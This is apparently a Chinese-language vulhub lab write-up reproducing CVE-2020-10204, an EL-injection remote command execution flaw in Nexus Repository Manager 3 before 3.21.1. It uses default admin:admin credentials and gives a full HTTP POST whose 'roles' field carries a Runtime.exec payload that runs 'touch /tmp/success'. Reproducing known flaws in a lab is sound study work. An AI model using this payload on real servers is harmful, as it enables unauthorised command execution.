

# Nexus Repository Manager 3 远程命令执行漏洞（CVE-2020-10204）

###### by ADummy

### 0x00利用路线

​			登录抓包--->获取cookie和csrf token--->burpsuite发包--->命令执行

### 0x01漏洞介绍

​			Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等软件源仓库。其3.21.1及之前版本中，存在一处任意EL表达式注入漏洞，这个漏洞是CVE-2018-16621的绕过。

影响版本

```
Nexus Repository Manager 3 < 3.21.1
```

### 0x02漏洞复现

​	等待一段时间环境才能成功启动，访问`http://your-ip:8081`即可看到Web页面。

该漏洞需要至少普通用户身份，所以我们需要使用账号密码`admin:admin`登录后台。

![Nexus_Repository_Manager3_RCE_31](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Nexus_Repository_Manager3_RCE_31.jpg)



登录后，复制当前Cookie和CSRF Token，发送如下数据包，即可执行EL表达式：

```
POST /service/extdirect HTTP/1.1
Host: 192.168.0.142:8081
Content-Length: 223
X-Requested-With: XMLHttpRequest
X-Nexus-UI: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.6813274455108288
Content-Type: application/json
Accept: */*
Origin: http://192.168.0.142:8081
Referer: http://192.168.0.142:8081/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 278d086ce087c25389bba6fecb03d8a9=3f769ae53838e13e44a4ee0a5fe70526; NX-ANTI-CSRF-TOKEN=0.6813274455108288; NXSESSIONID=5337e2ee-1fd7-4a7f-9386-4b24280fb268
Connection: close

{"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"2","firstName":"admin","lastName":"User","email":"admin@example.org","status":"active","roles":["nxadmin$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/success')}],"type":"rpc","tid":11}
```

![Nexus_Repository_Manager3_RCE_31](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Nexus_Repository_Manager3_RCE_32.jpg)



进入docker 发现   touch  /tmp/success被执行

![Nexus_Repository_Manager3_RCE_31](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Nexus_Repository_Manager3_RCE_33.jpg)

